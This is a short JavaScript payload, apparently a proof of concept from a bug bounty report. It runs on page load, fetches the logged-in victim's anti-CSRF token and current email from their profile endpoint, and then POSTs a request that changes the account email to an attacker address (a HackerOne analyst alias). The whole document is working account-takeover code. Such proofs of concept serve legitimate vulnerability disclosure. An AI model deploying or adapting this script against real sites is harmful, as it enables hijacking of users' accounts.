$(document).ready(function() {

    // returns the anti-csrf token and current email address of the victim
    function fetchInfo() {
        var currentEmail = "";
        var userCsrfToken = "";
        $.ajax({
            url: "/users/" + utag_data.context.user.tuid + "/profile",
            async: false,
            success: function(data) {
                userCsrfToken = data.csrfToken;
                currentEmail = data.email;
            }
        });
        return [userCsrfToken, currentEmail];
    }
    
    function changeEmail(newEmail) {
        var userInfo = fetchInfo();
        var emailChangeUrl = "/users/" + utag_data.context.user.tuid + "/updateemail"
        var requestData = { 
            "newEmail": newEmail,
            "hiddenNewEmail": userInfo[1],
            "unsubscribe_on_updateEmail": "false",
            "confirmNewEmail": newEmail,
            "csrfToken": userInfo[0]
        };
        $.ajax({
            url: emailChangeUrl,
            type: "POST",
            async: false,
            data: JSON.stringify(requestData),
            contentType: "application/json"
        });
    }
    
    // triggering change email with the attacker's email address
    changeEmail("analysts+accc111@managed.hackerone.com");
    
});
